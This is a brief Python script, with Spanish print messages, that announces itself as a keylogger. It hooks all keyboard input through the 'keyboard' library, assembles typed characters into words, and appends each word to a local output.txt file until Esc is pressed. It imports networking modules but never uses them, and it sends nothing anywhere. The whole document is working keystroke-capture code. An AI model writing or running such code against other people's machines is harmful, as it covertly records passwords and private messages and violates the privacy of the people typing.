import keyboard
import sys
import socket
import os

print("""
*****************
    INICIO
    KEYLOGGER UP
*****************
""")
palabra=""

def pulsacion(event):
    global palabra
    if event.event_type==keyboard.KEY_DOWN:
        if len(event.name)== 1 and event.name.isprintable() :
            palabra += event.name
        elif event.name == "space" or event.name=="tab" or event.name=="enter":
            guardar_palabra()

def guardar_palabra():
    global palabra
    with open("output.txt", "a") as file:
        file.write(palabra+"\n")
    print(f"Palabra registrada: {palabra}")
    palabra=""

keyboard.hook(pulsacion)

try:
    keyboard.wait("esc")
except KeyboardInterrupt:
    print("Se detuvo el script")
    pass
